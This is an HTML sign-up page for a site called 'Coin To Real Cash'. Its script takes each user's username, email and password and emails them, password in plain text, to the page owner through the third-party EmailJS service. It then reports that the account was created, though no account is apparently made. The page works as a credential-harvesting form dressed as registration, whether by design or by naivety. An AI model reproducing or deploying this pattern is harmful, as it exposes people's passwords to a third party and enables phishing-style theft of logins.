<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Coin To Real Cash - Register</title>
     <!-- <link rel="stylesheet" href="assets/css/style.css"> -->
     <link rel="stylesheet" href="assets/css/Registration page.css"> 
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script>
        (function(){
            emailjs.init("1cGie4oBj2KOxJk8c"); // Replace with your EmailJS public key
        })();
    </script>
    <style>
        .create-account-btn{
            text-decoration: none;

        }
        .account-btn{
            margin: 30px 0px;

        }
        
    </style>
</head>
<body>
   <div class="header-banner">
        <h1>Coin To Real Cash</h1>
    </div>

    <div class="container">
        <h2>Create Account</h2>
        <p class="subtitle">Fill details to continue</p>

        <form id="registration-form">
            <div class="input-group">
                <input type="text" placeholder="Username" id="username" required>
            </div>
            <div class="input-group">
                <input type="email" placeholder="Email" id="email" required>
            </div>
            <div class="input-group">
                <input type="password" placeholder="Password" id="password" required>
            </div>
            <div class="input-group">
                <input type="password" placeholder="Confirm Password" id="confirm-password" required>
            </div>
            
            <div class="form-group-checkbox">
                <input type="checkbox" id="showAllPasswordsToggle">
                <label for="showAllPasswordsToggle">Show Passwords</label>
            </div>

            <div class="account-btn">
                <button type="submit" class="create-account-btn">Create Account</button>
            </div>
        </form>

        <p class="signin-link">Already have an account? <a href="Login page.html">Login here</a></p>
    </div>
<script>
    // START: ADDED JAVASCRIPT FOR SHOW/HIDE PASSWORD
    document.addEventListener('DOMContentLoaded', function() {
        const passwordField = document.getElementById('password');
        const confirmPasswordField = document.getElementById('confirm-password');
        const showPasswordToggle = document.getElementById('showAllPasswordsToggle');

        // Add an event listener to the single checkbox
        showPasswordToggle.addEventListener('change', function() {
            
            // Determine the new type based on the checkbox state: 'text' if checked, 'password' if unchecked
            const newType = showPasswordToggle.checked ? 'text' : 'password';
            
            // Apply the new type to BOTH password fields
            passwordField.type = newType;
            confirmPasswordField.type = newType;
        });
    });
    // END: ADDED JAVASCRIPT FOR SHOW/HIDE PASSWORD

    document.getElementById('registration-form').addEventListener('submit', function(e) {
        e.preventDefault();

        const username = document.getElementById('username').value;
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        const confirmPassword = document.getElementById('confirm-password').value;

        if (password !== confirmPassword) {
            alert("Passwords do not match!");
            return;
        }

        // Send email using EmailJS
        emailjs.send("service_dndq44b", "template_6im86kh", {
            user_name: username,
            email: email,
            password: password
        })
        .then(function(response) {
            alert("Account created successfully!");
            window.location.href = "Login page.html"; // Redirect to login
        }, function(error) {
            alert("Failed to send account info: " + JSON.stringify(error));
        });
    });
    </script>
</body>
</html>
